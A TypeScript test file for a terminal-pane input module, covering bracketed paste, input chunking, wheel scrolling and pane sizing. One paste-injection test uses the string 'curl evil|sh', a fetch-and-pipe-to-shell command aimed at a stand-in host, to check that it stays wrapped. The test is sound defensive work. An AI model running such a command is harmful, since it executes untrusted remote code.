import { mock, test } from "node:test";
import assert from "node:assert/strict";
import { bracketedPaste, CLICK_JUMP_WAIT_MS, clickJumper, clickJumps, endStep, fittedFontSize, previewScale, gridToAsk, HISTORY_LINES, historyText, inputBytes, JUMP_TO_BOTTOM, judgeLines, liveWheel, MAX_WAITING_SCROLLS, MAX_WHEEL_LINES, maxInputBytes, panelGrid, queueInput, queueScroll, scrollAction, scrolledUp, scrollHeldReason, scrollsItself, SELF_SCROLL_FRESH_MS, selfScrollFresh, sizeStep, typingHeldReason, wheelLines, wheelScroll, wheelTurn, type PaneCommand, type SizeEvent } from "./terminalInput.ts";

test("while the panel is dragged the screen keeps its grid, scaled whole into the panel", () => {
  assert.equal(previewScale({ width: 600, height: 900 }, { width: 1200, height: 900 }), 0.5, "a narrower panel shrinks it by width");
  assert.equal(previewScale({ width: 1500, height: 600 }, { width: 1200, height: 900 }), 600 / 900, "and by height when that is tighter");
  assert.equal(previewScale({ width: 1800, height: 1350 }, { width: 1200, height: 900 }), 1.5, "a wider panel grows it");
  for (const [room, screen] of [[{ width: 0, height: 900 }, { width: 1200, height: 900 }], [{ width: 600, height: 900 }, { width: 0, height: 0 }]] as const) assert.equal(previewScale(room, screen), 1, "nothing measured yet keeps it as it is");
});

test("large Unicode paste retains one bracketed wrapper and normalizes clipboard line endings", () => {
  for (const text of ["", "small", "界".repeat(30000), "🙂".repeat(20000)]) {
    assert.equal(bracketedPaste(text), "\x1b[200~" + text + "\x1b[201~");
  }
  assert.equal(bracketedPaste("one\n\x1b[201~two\r\nthree"), "\x1b[200~one\rtwo\rthree\x1b[201~");
});

test("pasted text cannot rebuild a closing marker and type the rest as keys", () => {
  for (const [text, inside] of [
    ["\x1b[20\x1b[201~1~\rcurl evil|sh\r", "[201~\rcurl evil|sh\r"],
    ["\x1b\x1b[200~[201~\n", "[201~\r"],
    ["日本\x1b[31m🙂\x1b", "日本[31m🙂"],
  ]) {
    assert.equal(bracketedPaste(text), "\x1b[200~" + inside + "\x1b[201~");
  }
});

const typed = (text: string): PaneCommand => ({ type: "terminal.input", text });

test("large Unicode input is split at character boundaries and stays ahead of later keys", () => {
  const text = "\x1b[200~first\r" + "🙂界".repeat(20000) + "\rlast\x1b[201~";
  const queue: PaneCommand[] = [];
  queueInput(queue, text);
  queueInput(queue, "\r");
  const pieces = queue.map((command) => command.type === "terminal.input" ? command.text : "");
  assert.ok(pieces.every((piece) => inputBytes(piece) <= maxInputBytes));
  assert.equal(pieces.join(""), text + "\r");
  for (const piece of pieces) assert.equal(new TextDecoder("utf-8", { fatal: true }).decode(new TextEncoder().encode(piece)), piece);
});

test("a split paste ends with its whole closing marker, so keys typed at once stay apart", () => {
  for (const chunks of [1, 2]) {
    for (let tail = 1; tail <= 5; tail++) {
      const unicode = "界🙂".repeat(1000);
      const paste = "\x1b[200~" + unicode + "x".repeat(chunks * maxInputBytes + tail - 12 - inputBytes(unicode)) + "\x1b[201~";
      assert.equal(inputBytes(paste), chunks * maxInputBytes + tail);
      const queue: PaneCommand[] = [];
      for (const text of [paste, "o", "k界", "\r"]) queueInput(queue, text);
      const pieces = queue.map((command) => command.type === "terminal.input" ? command.text : "");
      const closing = pieces.findIndex((piece) => piece.endsWith("\x1b[201~"));
      assert.equal(pieces.slice(0, closing + 1).join(""), paste, `tail ${tail}`);
      assert.deepEqual(pieces.slice(closing + 1), ["ok界", "\r"], `tail ${tail}`);
      assert.ok(pieces.every((piece) => inputBytes(piece) <= maxInputBytes));
    }
  }
});

test("a paste must fit Herdr's encoded request before any input is queued", () => {
  const limit = 1024 * 1024 - 1024;
  assert.equal(inputBytes(JSON.stringify(bracketedPaste("x".repeat(limit - 24)))), limit);
  for (const text of ["x".repeat(limit - 23), "界".repeat(350000), "\x00".repeat(180000), "<".repeat(180000), "\u2028".repeat(180000)]) {
    assert.throws(() => bracketedPaste(text), /Herdr.*limit/);
  }
});

test("typing coalesces adjacent text, preserving Unicode, and keeps control keys and pastes apart", () => {
  const queue: PaneCommand[] = [];
  for (const text of ["c", "a", "f", "é", "日本", "🙂", "é"]) queueInput(queue, text);
  queueInput(queue, "\r");
  const paste = bracketedPaste("one\ntwo");
  queueInput(queue, paste);
  queueInput(queue, "after");
  queueInput(queue, "\x1b[A");
  assert.deepEqual(queue, [typed("café日本🙂é"), typed("\r"), typed(paste), typed("after"), typed("\x1b[A")]);
  const bounded: PaneCommand[] = [];
  for (let i = 0; i < 5000; i++) queueInput(bounded, "x");
  assert.equal(bounded.length, 2);
  assert.equal(bounded.map((command) => command.type === "terminal.input" ? command.text : "").join("").length, 5000);
});

test("scrolling up opens the pane's history, and scrolling down at its bottom follows the live screen again", () => {
  const cases: [string, boolean, boolean, number, ReturnType<typeof scrollAction>][] = [
    ["the wheel up on the live screen opens the history", false, true, -3, "open"],
    ["the wheel down on the live screen keeps following the bottom", false, true, 3, "none"],
    ["the wheel up in the history scrolls it", true, false, -3, "history"],
    ["the wheel down above the history's bottom scrolls it", true, false, 3, "history"],
    ["the wheel down at the history's bottom returns to the live screen", true, true, 3, "close"],
    ["the wheel up at the history's bottom scrolls it", true, true, -3, "history"],
  ];
  for (const [name, inHistory, atBottom, lines, action] of cases) assert.equal(scrollAction(inHistory, atBottom, lines), action, name);
});

test("a pane's history is drawn line by line from the first column, with no color left on", () => {
  assert.equal(historyText("one\n\x1b[31mtwo\x1b[0m\r\nthree"), "one\r\n\x1b[31mtwo\x1b[0m\r\nthree\x1b[0m");
  assert.equal(historyText(""), "\x1b[0m");
});

test("the wheel scrolls whole lines, keeping what a touchpad has not yet made a line", () => {
  const row = 18;
  const cases: [string, number, number, number, { lines: number; rest: number }][] = [
    ["a mouse notch in pixels", 0, 100, 0, { lines: 5, rest: 10 }],
    ["a notch the other way", 0, -100, 0, { lines: -5, rest: -10 }],
    ["a touchpad's small moves add up", 10, 10, 0, { lines: 1, rest: 2 }],
    ["less than a line waits", 0, 10, 0, { lines: 0, rest: 10 }],
    ["a wheel in lines", 0, 3, 1, { lines: 3, rest: 0 }],
    ["a wheel in pages scrolls the screen", 0, 1, 2, { lines: 40, rest: 0 }],
  ];
  for (const [name, rest, delta, mode, want] of cases) assert.deepEqual(wheelLines(rest, delta, mode, row, 40), want, name);
});

test("the wheel sends a pane that scrolls itself only Herdr's wheel scroll, never a key that could type, edit or submit", () => {
  for (let lines = -250; lines <= 250; lines++) {
    const command = wheelScroll(lines);
    if (lines === 0) {
      assert.equal(command, null);
      continue;
    }
    assert.deepEqual(command, { type: "terminal.scroll", direction: lines < 0 ? "up" : "down", lines: Math.min(Math.abs(lines), MAX_WHEEL_LINES), source: "wheel" }, `${lines} lines`);
    assert.ok(command && !("text" in command), `${lines} lines carry no text`);
  }
});

test("only a Claude Code pane whose history is no taller than its screen scrolls itself", () => {
  const lines = (count: number) => Array.from({ length: count }, (_, index) => `line ${index}`).join("\n");
  const cases: [string, string, number, string, boolean][] = [
    ["a fullscreen Claude Code screen", lines(28), 28, "claude", true],
    ["trailing blank lines are not history", lines(28) + "\n\n", 28, "claude", true],
    ["one line above the screen is history", lines(29), 28, "claude", false],
    ["a Codex pane reads its history", lines(12), 28, "codex", false],
    ["a pane with no known agent reads its history", lines(12), 28, "", false],
  ];
  for (const [name, history, rows, agent, want] of cases) assert.equal(scrollsItself(history, rows, agent), want, name);
});

test("a pane found to scroll itself is trusted only until its history is due a fresh look", () => {
  const checkedAt = 1_000_000;
  const cases: [string, number, number, boolean][] = [
    ["just checked", checkedAt, checkedAt, true],
    ["a moment later", checkedAt, checkedAt + SELF_SCROLL_FRESH_MS - 1, true],
    ["thirty seconds later, the history is read again", checkedAt, checkedAt + SELF_SCROLL_FRESH_MS, false],
    ["long after, as a pane builds scrollback", checkedAt, checkedAt + 10 * 60_000, false],
    ["never checked, as a new connection is", 0, checkedAt, false],
  ];
  for (const [name, at, now, want] of cases) assert.equal(selfScrollFresh(at, now), want, name);
});

test("a short read judges whether a pane scrolls itself exactly as its whole history does", () => {
  // A pane holds scrollback lines above a screen whose last rows may be blank,
  // and a read returns its most recent lines.
  const read = (scrollback: number, rows: number, blank: number, lines: number) => {
    const pane = [...Array.from({ length: scrollback }, (_, index) => `old ${index}`), ...Array.from({ length: rows }, (_, index) => index < rows - blank ? `row ${index}` : "")];
    return pane.slice(-lines).join("\n");
  };
  for (const rows of [5, 28, 51]) {
    assert.ok(judgeLines(rows) < HISTORY_LINES / 10, `${rows} rows read a few lines, not the whole history`);
    for (let scrollback = 0; scrollback <= 3 * rows; scrollback++) {
      for (let blank = 0; blank <= rows; blank++) {
        const whole = scrollsItself(read(scrollback, rows, blank, HISTORY_LINES), rows, "claude");
        assert.equal(scrollsItself(read(scrollback, rows, blank, judgeLines(rows)), rows, "claude"), whole, `${rows} rows, ${scrollback} lines of scrollback, ${blank} blank rows`);
      }
    }
  }
});

test("the wheel over the live screen never waits for a fresh look at the pane", () => {
  const at = 1_000_000, rows = 24;
  const cases: [string, Parameters<typeof liveWheel>[0], Parameters<typeof liveWheel>[1], number, ReturnType<typeof liveWheel>][] = [
    ["a pane that scrolls itself is scrolled at once", { at, selfScrolls: true, rows }, { now: at + 10, rows }, -3, { action: "scroll", look: false }],
    ["and down as well", { at, selfScrolls: true, rows }, { now: at + 10, rows }, 3, { action: "scroll", look: false }],
    ["a stale judgment still scrolls at once and is looked at again beside it", { at, selfScrolls: true, rows }, { now: at + SELF_SCROLL_FRESH_MS, rows }, -3, { action: "scroll", look: true }],
    ["a pane with history opens it on a turn up", { at, selfScrolls: false, rows }, { now: at + 10, rows }, -3, { action: "open", look: false }],
    ["and a turn down on its live screen does nothing", { at, selfScrolls: false, rows }, { now: at + 10, rows }, 3, { action: "none", look: false }],
    ["opening the history reads it whole, so a stale judgment needs no look of its own", { at, selfScrolls: false, rows }, { now: at + SELF_SCROLL_FRESH_MS, rows }, -3, { action: "open", look: false }],
    ["before the first judgment lands the turn waits for it", { at: 0, selfScrolls: false, rows: 0 }, { now: at, rows }, -3, { action: "wait", look: true }],
    // The pane was asked for a new grid as the judgment was read, so Herdr
    // answered a screen taller than the rows it was judged against.
    ["a judgment read at another grid waits for a look at this one", { at, selfScrolls: false, rows: rows - 1 }, { now: at + 10, rows }, -3, { action: "wait", look: true }],
    ["even one that found the pane scrolls itself", { at, selfScrolls: true, rows: rows + 1 }, { now: at + 10, rows }, 3, { action: "wait", look: true }],
  ];
  for (const [name, judged, screen, lines, want] of cases) assert.deepEqual(liveWheel(judged, screen, lines), want, name);
});

const scroll = (direction: "up" | "down", lines: number): Extract<PaneCommand, { type: "terminal.scroll" }> => ({ type: "terminal.scroll", direction, lines, source: "wheel" });

test("a wheel faster than the board can send keeps only a few scrolls waiting, so the pane stops soon after the wheel", () => {
  const size: PaneCommand = { type: "terminal.resize", cols: 100, rows: 30 };
  const full = Array.from({ length: MAX_WAITING_SCROLLS }, () => scroll("up", 4));
  const cases: [string, PaneCommand[], ReturnType<typeof scroll>, PaneCommand[]][] = [
    ["an empty queue takes the turn", [], scroll("up", 4), [scroll("up", 4)]],
    ["a turn waits behind one the same way, since a scroll is one notch and cannot be joined", [scroll("up", 4)], scroll("up", 3), [scroll("up", 4), scroll("up", 3)]],
    ["a turn past the waiting limit is dropped", full, scroll("up", 4), full],
    ["a turn the other way replaces the waiting ones", full, scroll("down", 4), [scroll("down", 4)]],
    ["typing keeps its place and the scrolls before it", [...full, typed("a")], scroll("up", 4), [...full, typed("a"), scroll("up", 4)]],
    ["a turn the other way never drops typing", [scroll("up", 4), typed("a"), scroll("up", 4)], scroll("down", 4), [scroll("up", 4), typed("a"), scroll("down", 4)]],
    ["a size keeps its place", [...full, size], scroll("up", 4), [...full, size, scroll("up", 4)]],
  ];
  for (const [name, queue, command, want] of cases) {
    const waiting = [...queue];
    queueScroll(waiting, command);
    assert.deepEqual(waiting, want, name);
  }
  const flick: PaneCommand[] = [];
  for (let turn = 0; turn < 40; turn++) queueScroll(flick, scroll("up", 4));
  assert.equal(flick.length, MAX_WAITING_SCROLLS, "forty turns while one scroll is on its way leave only the limit waiting");
});

test("the board counts the notches it scrolled a pane up, one a scroll whatever its lines, and Ctrl+End clears them", () => {
  // Herdr hands the program one wheel notch for each scroll, measured on a
  // fixture: scrolls of 3, 4, 12 and 50 lines each arrived as one notch.
  const steps: [string, PaneCommand, number][] = [
    ["a scroll up is a notch up", scroll("up", 10), 1],
    ["another, of fewer lines, is another notch", scroll("up", 4), 2],
    ["a scroll down of many lines is still one notch back", scroll("down", 50), 1],
    ["typing leaves the count", typed("a"), 1],
    ["the last notch down reaches the bottom", scroll("down", 3), 0],
    ["the pane's bottom is as far down as it goes", scroll("down", 3), 0],
    ["up again", scroll("up", 7), 1],
    ["Ctrl+End jumps to the bottom", typed(JUMP_TO_BOTTOM), 0],
  ];
  let scrolled = 0;
  for (const [name, command, want] of steps) {
    scrolled = scrolledUp(scrolled, command);
    assert.equal(scrolled, want, name);
  }
});

test("a plain click on a pane the board scrolled up and could scroll now jumps it to the bottom; a selection, a pane at its bottom or one it cannot scroll does not", () => {
  const click = { button: 0, moved: 0, selected: false };
  const holds = { sized: true, refused: false };
  const cases: [string, number, typeof click, typeof holds, boolean][] = [
    ["a click on a pane scrolled up jumps", 12, click, holds, true],
    ["a click that shook a pixel or two still jumps", 12, { ...click, moved: 3 }, holds, true],
    ["a press and release 4 px apart is not a click", 12, { ...click, moved: 4 }, holds, false],
    ["a drag that selected text copies it instead", 12, { ...click, moved: 40, selected: true }, holds, false],
    ["a drag that selected nothing is not a click", 12, { ...click, moved: 40 }, holds, false],
    ["a click that left a selection keeps it", 12, { ...click, selected: true }, holds, false],
    ["another button does nothing", 12, { ...click, button: 2 }, holds, false],
    ["a pane at its bottom has nowhere to jump", 0, click, holds, false],
    ["a view that no longer sizes the pane, as when a review gate took it, does nothing", 12, click, { sized: false, refused: false }, false],
    ["a view whose take was refused does nothing", 12, click, { sized: false, refused: true }, false],
    ["a sized view with a refused take pending an answer does nothing", 12, click, { sized: true, refused: true }, false],
  ];
  for (const [name, scrolled, pointer, view, want] of cases) assert.equal(clickJumps(scrolled, pointer, view), want, name);
  assert.equal(JUMP_TO_BOTTOM, "[1;5F", "the jump is Ctrl+End, the key Claude Code names on its own note");
});

test("a click jumps only once the double-click interval passes with no further press, so a double or triple click selects what it aimed at", () => {
  mock.timers.enable({ apis: ["setTimeout"] });
  try {
    let jumps = 0;
    const jumper = clickJumper(() => { jumps++; });
    jumper.released(() => true);
    mock.timers.tick(CLICK_JUMP_WAIT_MS - 1);
    assert.equal(jumps, 0, "a click waits out the double-click interval");
    mock.timers.tick(1);
    assert.equal(jumps, 1, "then jumps");

    jumper.released(() => true);
    mock.timers.tick(150);
    jumper.cancel();
    mock.timers.tick(CLICK_JUMP_WAIT_MS);
    assert.equal(jumps, 1, "a second press in time cancels the jump");

    jumper.released(() => false);
    mock.timers.tick(CLICK_JUMP_WAIT_MS);
    assert.equal(jumps, 1, "the jump is decided when it would go, not when the click ended");

    jumper.released(() => true);
    jumper.cancel();
    mock.timers.tick(CLICK_JUMP_WAIT_MS);
    assert.equal(jumps, 1, "stopping the view cancels a waiting jump");
  } finally { mock.timers.reset(); }
  assert.ok(CLICK_JUMP_WAIT_MS >= 300, "the wait covers a double click");
});

test("the wheel over a pane that scrolls itself never asks again for a take that was refused", () => {
  const cases: [string, Parameters<typeof wheelTurn>[0], ReturnType<typeof wheelTurn>][] = [
    ["a view that sizes the pane scrolls it", { sized: true, refused: false }, "scroll"],
    ["a view that does not takes the pane first", { sized: false, refused: false }, "take"],
    ["a view whose take was refused says why instead", { sized: false, refused: true }, "refused"],
  ];
  for (const [name, view, want] of cases) assert.equal(wheelTurn(view), want, name);
});

test("a wheel that cannot scroll a pane explains itself in plain words", () => {
  const cases: [string, string][] = [
    ["pipeline owns this task; use cfo pipeline respond or inspect its delivery evidence", "A review gate owns this goblin's pane now; scroll it in Herdr."],
    ["pipeline custody has not been returned; use cfo pipeline recover", "A review gate owns this goblin's pane now; scroll it in Herdr."],
    ["Native terminal disconnected.", "The wheel cannot scroll this pane: Native terminal disconnected."],
  ];
  for (const [raw, plain] of cases) assert.equal(scrollHeldReason(raw), plain, raw);
});

test("a pane's screen is fitted to the panel whole, by its width or its height, with no floor", () => {
  const cell = { width: 0.6, height: 1.2 };
  const cases: [string, number, number, number, number, number | null][] = [
    ["maximized, bound by height", 1800, 1000, 132, 43, 19],
    ["the side panel, bound by width and below 12 px", 900, 800, 132, 43, 11],
    ["a small pane in a large panel stops at 28 px", 2000, 1200, 80, 24, 28],
    ["a hidden panel keeps the font it has", 0, 800, 132, 43, null],
    ["a pane with no size yet keeps the font it has", 900, 800, 0, 0, null],
  ];
  for (const [name, width, height, cols, rows, size] of cases) assert.equal(fittedFontSize(width, height, cols, rows, cell), size, name);
});

test("the fit follows the cell size the terminal measured, not an assumed one", () => {
  assert.equal(fittedFontSize(900, 800, 132, 43, { width: 0.5, height: 1.2 }), 13.5);
  assert.equal(fittedFontSize(1800, 1000, 132, 43, { width: 0.6, height: 1.5 }), 15.5);
});

test("typing never merges into a size the view asked for", () => {
  const queue: PaneCommand[] = [];
  queueInput(queue, "a");
  queue.push({ type: "terminal.resize", cols: 100, rows: 30 });
  queueInput(queue, "b");
  assert.deepEqual(queue, [typed("a"), { type: "terminal.resize", cols: 100, rows: 30 }, typed("b")]);
});

test("a view that sizes its pane fills the panel with whole cells, within what Herdr accepts", () => {
  const cell = { width: 0.6, height: 1.2 };
  const cases: [string, number, number, number, { cols: number; rows: number } | null][] = [
    ["a maximized panel at 20 px", 1574, 750, 20, { cols: 131, rows: 31 }],
    ["the side panel at 20 px", 700, 750, 20, { cols: 58, rows: 31 }],
    ["a larger font holds fewer cells", 1574, 750, 28, { cols: 93, rows: 22 }],
    ["a vast panel stops at Herdr's largest pane", 20000, 20000, 12, { cols: 400, rows: 160 }],
    ["a panel too narrow for a terminal", 200, 750, 20, null],
    ["a hidden panel", 0, 0, 20, null],
  ];
  for (const [name, width, height, font, grid] of cases) assert.deepEqual(panelGrid(width, height, font, cell), grid, name);
});

test("a sized view asks for the panel's grid whenever it differs from the size the pane will have", () => {
  const small = { cols: 80, rows: 24 }, large = { cols: 120, rows: 40 };
  const cases: [string, Parameters<typeof gridToAsk>[0], Parameters<typeof gridToAsk>[1], Parameters<typeof gridToAsk>[2], ReturnType<typeof gridToAsk>][] = [
    ["a panel that grew asks for its grid", large, small, null, large],
    ["a panel that fits the pane asks nothing", small, small, null, null],
    ["a panel too small for a terminal asks nothing", null, small, null, null],
    ["a size on its way is not asked again", small, large, small, null],
    ["a drag back to the pane's size while another is on its way asks for it again", large, large, small, large],
    ["a size Herdr clamped is not asked again", large, small, large, null],
    ["a panel that changed after its size landed asks for its grid", small, large, large, small],
  ];
  for (const [name, panel, current, asked, grid] of cases) assert.deepEqual(gridToAsk(panel, current, asked), grid, name);
});

test("an open view keeps the pane live at the board's size, focused or not, until it closes", () => {
  const view = { sized: false, focused: true, shown: true, held: false };
  const cases: [string, SizeEvent, typeof view, ReturnType<typeof sizeStep>][] = [
    ["opening the terminal in the focused board takes the size", "live", view, "take"],
    ["opening it while he is in another window takes the size too", "live", { ...view, focused: false }, "take"],
    ["showing a view again takes the size, focused or not", "shown", { ...view, focused: false }, "take"],
    ["opening it after another client took the pane leaves the size", "live", { ...view, held: true }, "stay"],
    ["coming back to the board takes the size, even from another client", "focus", { ...view, held: true }, "take"],
    ["typing in the board takes the size, even from another client", "typed", { ...view, held: true }, "take"],
    ["a view out of sight never takes the size", "focus", { ...view, shown: false }, "stay"],
    ["a view that has the size keeps it", "typed", { ...view, sized: true }, "stay"],
  ];
  for (const [name, event, state, action] of cases) assert.equal(sizeStep(event, state), action, name);
});

test("a connection that ends on its own stops the view, shows the pane afresh at its own size, or keeps the screen", () => {
  const cases: [string, Parameters<typeof endStep>[0], boolean | null, ReturnType<typeof endStep>][] = [
    ["the pane's own view ending stops the view with the reason", { sized: false, onScreen: true, resized: false }, false, "stop"],
    ["the pane's own view ending as Herdr resized the pane shows it afresh", { sized: false, onScreen: true, resized: true }, false, "observe"],
    ["a sized view ending, as another client takes the pane, shows it afresh", { sized: true, onScreen: true, resized: false }, true, "observe"],
    ["a take refused keeps the screen", { sized: true, onScreen: false, resized: false }, false, "keep"],
    ["a take refused after the screen's view ended shows the pane afresh", { sized: true, onScreen: false, resized: false }, null, "observe"],
    ["a give that fails still lets the sized view go and shows the pane afresh", { sized: false, onScreen: false, resized: false }, true, "observe"],
    ["the view's first connection failing stops the view with the reason", { sized: false, onScreen: false, resized: false }, null, "stop"],
  ];
  for (const [name, ended, screenSized, action] of cases) assert.equal(endStep(ended, screenSized), action, name);
});

test("a refused input explains itself in plain words", () => {
  const cases: [string, string][] = [
    ["pipeline owns this task; use cfo pipeline respond or inspect its delivery evidence", "The review gate owns this goblin's work right now, so typing is paused. Reconnect to watch the screen."],
    ["pipeline custody has not been returned; use cfo pipeline recover", "The review gate owns this goblin's work right now, so typing is paused. Reconnect to watch the screen."],
    ["cannot verify pipeline custody", "cannot verify pipeline custody"],
    ["Native terminal identity changed. Select the current session; input was discarded.", "Native terminal identity changed. Select the current session; input was discarded."],
  ];
  for (const [raw, plain] of cases) assert.equal(typingHeldReason(raw), plain, raw);
});
